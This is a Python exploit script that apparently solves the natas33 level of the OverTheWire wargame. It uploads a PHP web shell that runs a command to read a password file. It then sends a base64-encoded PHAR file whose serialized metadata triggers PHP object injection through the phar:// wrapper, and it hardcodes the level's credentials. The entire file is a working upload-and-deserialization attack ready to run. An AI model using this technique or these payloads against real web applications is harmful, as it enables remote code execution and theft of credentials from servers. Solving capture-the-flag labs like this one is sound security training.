import requests
import base64
import re

def second_upload(url,username,password):
    b64_payload = """PD9waHAgX19IQUxUX0NPTVBJTEVSKCk7ID8+DQrCAAAAAQAAABEAAAABAAAAAACMAAAATzo4OiJFeGVjdXRvciI6NDp7czox
    ODoiAEV4ZWN1dG9yAGZpbGVuYW1lIjtzOjk6InNoZWxsLnBocCI7czoxOToiAEV4ZWN1dG9yAHNpZ25hdHVyZSI7YjoxO3M6MTQ6IgBFeGVjdXRvc
    gBpbml0IjtiOjA7czo0OiJkYXRhIjtzOjQ6InJpcHMiO30IAAAAdGVzdC50eHQEAAAAAAAAAAQAAADHp4s7pAEAAAAAAAB0ZXh0N/cAQXxpewAP0W
    dglvkUOpb5HGdpY6IbX3xsC97dN7oDAAAAR0JNQg=="""
    payload = base64.b64decode(b64_payload)
    file_data = {
            "MAX_FILE_SIZE":"4096",
            "filename":"natas.phar",
            }
    file_upload = {
            "uploadedfile":("natas.phar",payload,{"Content-Type":"application/octet-stream","Content-Disposition":"form-data"})
            }
    requests.post(url + "index.php",data=file_data, files=file_upload,auth=(username,password))
    
    file_data = {
            "MAX_FILE_SIZE":"4096",
            "filename":"phar://natas.phar/test.txt",
            }
    flag_req = requests.post(url + "index.php",data=file_data, files=file_upload,auth=(username,password))
    text = re.findall("Running firmware update: shell.php <br>(.*)",flag_req.text)
    print("The flag for natas33 is: " + text[0])

def first_upload(url,username,password):
    site = requests.get(url,auth=(username,password))
    if site.status_code == 401:
        print("Wrong credentials")
        exit()
    payload = "<?php echo shell_exec('cat /etc/natas_webpass/natas34'); ?>"
    file_data = {
            "MAX_FILE_SIZE":"4096",
            "filename":"shell.php",
            }
    file_upload = {
            "uploadedfile":("shell.php",payload,{"Content-Type":"application/x-php","Content-Disposition":"form-data"})
            }
    requests.post(url + "index.php",data=file_data, files=file_upload,auth=(username,password))
    second_upload(url,username,password)

if __name__=="__main__":
    url = "http://natas33.natas.labs.overthewire.org/"
    username = "natas33"
    password = "APwWDD3fRAf6226sgBOBaSptGwvXwQhG"
    first_upload(url,username,password)